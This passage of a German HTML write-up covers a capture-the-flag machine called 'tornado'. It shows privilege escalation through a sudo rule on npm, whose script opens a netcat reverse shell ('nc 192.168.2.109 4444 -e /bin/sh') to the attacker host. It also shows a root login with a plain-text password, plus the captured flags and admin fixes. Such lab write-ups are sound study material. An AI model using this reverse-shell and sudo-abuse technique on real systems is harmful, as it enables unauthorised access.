+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Port 4444 auf Ihrem Angreifer-System (<span class="command">192.168.2.109</span>). Führen Sie dann den `sudo`-Befehl aus: `sudo -u catchme npm run-script cool`.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regel für `npm` entfernen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                     <pre>listening on [any] 4444 ...</pre>
+                    <div class="prompt"># <span class="command">Auf Zielsystem:</span></div>
+                    <div class="prompt">www-data@tornado:/tmp/cool$ <span class="command">sudo -u catchme npm run-script cool</span></div>
+                     <pre>
+npm WARN npm npm does not support Node.js v10.21.0 <span class="password"><-- Warnungen, aber Skript wird ausgeführt</span>
+[...]
+> cool@1.0.0 cool /tmp/cool
+> nc 192.168.2.109 4444 -e /bin/sh
+</pre>
+                     <div class="prompt"># <span class="command">Auf Angreifer-System (Listener):</span></div>
+                     <div class="terminal"> <span class="password"><-- Format angepasst</span>
+                         <pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.110] 54260</span>
+</pre>
+                         <div class="prompt"># <span class="command">id</span></div> <span class="password"><-- Befehl in neuer Shell ausgeführt</span>
+                         <pre><span class="command">uid=1000(catchme) gid=1000(catchme) groups=1000(catchme),24(cdrom),[...]</span></pre>
+                     </div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Netcat-Listener wird auf Port 4444 gestartet. Auf dem Zielsystem wird `sudo -u catchme npm run-script cool` ausgeführt. Trotz einiger Warnungen bezüglich der Node.js-Version führt NPM das definierte `cool`-Skript aus, welches die Reverse Shell startet. Der Listener empfängt die Verbindung, und der `id`-Befehl bestätigt, dass die Shell nun als Benutzer `<span class="command">catchme</span>` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation von `www-data` zu `catchme` erfolgreich über den NPM-Exploit der `sudo`-Regel.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell als `catchme`. Enumerieren Sie weiter: `sudo -l`, Home-Verzeichnis, SUID-Dateien, Cronjobs. Suchen Sie die User-Flag.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie die unsichere `sudo`-Regel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">pwd</div>
+                     <pre>/tmp/cool</pre>
+                     <div class="prompt">cd</div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">ls</div>
+                     <pre>enc.py user.txt</pre>
+                     <div class="prompt">cat user.txt</div>
+                    <pre><span class="password">HMVkeyedcaesar</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `catchme` wird ins Home-Verzeichnis gewechselt. Dort befinden sich die Dateien `enc.py` und `user.txt`. Die User-Flag wird aus `user.txt` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> User-Flag gefunden. Die Datei `enc.py` ist ein wichtiger Hinweis für die weitere Eskalation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysieren Sie `enc.py`. Es handelt sich wahrscheinlich um ein Verschlüsselungs- oder Passwort-Skript, das Hinweise auf das Root-Passwort geben könnte.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion bezüglich der Flag.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">catchme@tornado:~$ <span class="command">su root</span></div>
+                     <pre>Password:</pre>
+                     <div class="prompt"># <span class="command">[Passworteingabe: idkrootpassword]</span></div> <span class="password"><-- Passwort wurde vermutlich durch Analyse von enc.py gefunden (Schritt fehlt im Log)</span>
+                     <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@tornado:/home/catchme# <span class="password"># Root-Login erfolgreich!</span></div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, mit `su root` zum Root-Benutzer zu wechseln. Das Passwort `<span class="password">idkrootpassword</span>` wird eingegeben. **Wichtiger Hinweis:** Das Log dokumentiert nicht, wie dieses Passwort gefunden wurde. Es ist sehr wahrscheinlich, dass die Analyse der Datei `enc.py` (die im vorherigen Schritt gefunden wurde) dieses Passwort oder einen Weg zu seiner Ableitung offenbarte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Privilege Escalation zu `root` erfolgreich abgeschlossen. Der exakte Mechanismus (Analyse von `enc.py`) fehlt im Log, aber das Ergebnis ist der Root-Zugriff.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Zugriff erreicht. Suchen Sie die Root-Flag.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das Root-Passwort. Untersuchen Sie das Skript `enc.py` auf Schwachstellen oder Informationslecks.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">root@tornado:/home/catchme# <span class="command">cd</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">root@tornado:~# <span class="command">ls</span></div>
+                    <pre>root.txt</pre>
+                    <div class="prompt">root@tornado:~# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">HMVgoodwork</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als `root` wird ins Home-Verzeichnis gewechselt und die Datei `root.txt` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wurde erfolgreich gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Ziele erreicht. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/catchme/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVkeyedcaesar</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMVgoodwork</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. November 2022</p> <!-- Korrektes Datum aus Nmap/Nikto extrahiert -->
+    </footer>
+</body>
+</html>
